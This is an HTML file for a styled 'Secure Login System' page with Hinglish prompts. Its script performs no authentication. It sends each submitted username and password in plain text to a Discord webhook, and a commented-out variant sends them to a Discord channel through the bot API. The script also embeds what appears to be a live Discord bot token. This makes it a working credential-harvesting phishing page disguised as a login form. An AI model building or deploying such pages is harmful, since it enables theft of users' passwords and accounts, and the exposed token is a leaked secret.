<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header h1 {
            color: #333;
            font-size: 28px;
            font-weight: 700;
        }

        .login-header p {
            color: #888;
            margin-top: 5px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            color: #555;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .message {
            margin-top: 20px;
            text-align: center;
            padding: 10px;
            border-radius: 8px;
            display: none;
        }

        .message.success {
            display: block;
            background: #d4edda;
            color: #155724;
        }

        .message.error {
            display: block;
            background: #f8d7da;
            color: #721c24;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #aaa;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>🔐 Login</h1>
            <p>Apna username aur password daalein</p>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="Apna username daalein" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Apna password daalein" required>
            </div>

            <button type="submit" class="login-btn">Login</button>
        </form>

        <div id="message" class="message"></div>
        <div class="footer">Secure Login System</div>
    </div>

    <script>
        // Discord Bot Webhook URL (replace with your actual webhook)
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
        
        // Ya agar aap bot token se direct send karna chahte hain toh:
        const BOT_TOKEN = 'MTUxOTIyMjgyNjA0Nzg5NzYyMA.G6bpgu.g-0hA7HsSwyWe1l9BDhvt_Hne7Ug4nW2lL81JA';
        const CHANNEL_ID = 'YOUR_CHANNEL_ID'; // Channel ID where you want to send

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');

            // Validate inputs
            if (username.length < 3 || password.length < 3) {
                messageDiv.className = 'message error';
                messageDiv.textContent = '❌ Username aur password kam se kam 3 characters ke hone chahiye!';
                return;
            }

            // Show loading state
            const submitBtn = document.querySelector('.login-btn');
            submitBtn.textContent = '⏳ Loading...';
            submitBtn.disabled = true;

            try {
                // Send data to Discord via webhook
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `🔔 **Naya Login Attempt!**\n\n**Username:** ${username}\n**Password:** ${password}\n**Time:** ${new Date().toLocaleString('hi-IN')}`
                    })
                });

                // Alternative: Direct message using Bot Token (requires bot in server)
                // const response = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
                //     method: 'POST',
                //     headers: {
                //         'Authorization': `Bot ${BOT_TOKEN}`,
                //         'Content-Type': 'application/json',
                //     },
                //     body: JSON.stringify({
                //         content: `🔔 **Naya Login Attempt!**\n\n**Username:** ${username}\n**Password:** ${password}\n**Time:** ${new Date().toLocaleString('hi-IN')}`
                //     })
                // });

                if (response.ok) {
                    messageDiv.className = 'message success';
                    messageDiv.textContent = '✅ Login successful! Data sent to Discord bot.';
                    
                    // Clear form
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                } else {
                    throw new Error('Failed to send data');
                }
            } catch (error) {
                console.error('Error:', error);
                messageDiv.className = 'message error';
                messageDiv.textContent = '❌ Error sending data to Discord. Please try again.';
            } finally {
                submitBtn.textContent = 'Login';
                submitBtn.disabled = false;
            }
        });

        // Console warning (for security awareness)
        console.log('%c⚠️ Security Warning!', 'color: red; font-size: 20px; font-weight: bold;');
        console.log('This is a demo login page. In production, use proper authentication!');
    </script>
</body>
</html>
